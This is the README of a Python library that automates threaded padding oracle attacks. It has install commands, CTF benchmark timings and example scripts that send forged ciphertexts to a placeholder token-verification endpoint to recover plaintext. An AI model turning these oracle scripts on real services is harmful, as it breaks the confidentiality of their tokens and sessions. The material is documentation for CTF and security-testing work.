# padding_oracle.py

Extremely fast threaded [padding oracle](http://server.maojui.me/Crypto/Padding_oracle_attack/) automation script for Python 3.

## Install

Installing from PyPI:

```shell
pip3 install -U padding_oracle
```

Or, installing from GitHub:

```shell
pip3 install -U git+https://github.com/djosix/padding_oracle.py.git
```

## Performance

Tested on [0x09] Cathub Party from EDU-CTF:

| Request Threads | Execution Time |
|-----------------|----------------|
| 1               | 17m 43s        |
| 4               | 5m 23s         |
| 16              | 1m 20s         |
| 64              | 56s            |

## Example

All you need is defining the **oracle function** to check whether the given cipher is correctly decrypted.

```python
from padding_oracle import *
import requests, string

# Create a requests.Session to enable connection pool
sess = requests.Session()

# Define a function to test if the cipher can be decrypted
def oracle(cipher: bytes):
    token = base64_encode(cipher)
    resp = sess.post('http://insucure.com/verify_token', data={'token': token})
    assert 'failed' in resp.text or 'success' in resp.text, 'exception???'
    return 'decryption failed' not in resp.text


# cipher = base64_decode(token)
cipher = b'[______IV______][____Block1____][____Block2____]'

# DECRYPT THE CIPHER!!!
plaintext = padding_oracle(cipher,
                           block_size=16,
                           oracle=oracle,
                           num_threads=16,
                           chars=string.printable)
```

New API usage 1:

```python
import logging
from padding_oracle import Solver, get_logger, plaintext_list_to_bytes, remove_padding

solver = Solver()
solver.logger = get_logger(level=logging.DEBUG)
solver.num_threads = 64

@solver.oracle
def oracle(cipher: bytes):
    token = base64_encode(cipher)
    resp = sess.post('http://insucure.com/verify_token', data={'token': token})
    assert 'failed' in resp.text or 'success' in resp.text, 'exception???'
    return 'decryption failed' not in resp.text

cipher = b'[______IV______][____Block1____][____Block2____]'

plaintext_list = solver.solve(cipher) # byte ord list that may contains None
plaintext_with_padding = plaintext_list_to_bytes(plaintext_list)
plaintext = remove_padding(plaintext_with_padding)
```

New API usage 2:

```python
import logging
from padding_oracle import solve, get_logger

def oracle(cipher: bytes):
    token = base64_encode(cipher)
    resp = sess.post('http://insucure.com/verify_token', data={'token': token})
    assert 'failed' in resp.text or 'success' in resp.text, 'exception???'
    return 'decryption failed' not in resp.text

plaintext = solve(
    cipher=b'[______IV______][____Block1____][____Block2____]',
    block_size=16,
    num_threads=64,
    validator=oracle,
    logger=get_logger() # default level is INFO
)
```

This package also provides PHP-like encoding/decoding functions:

```python
from padding_oracle.encoding import (
    urlencode, urldecode,
    base64_encode, base64_decode,
)
```
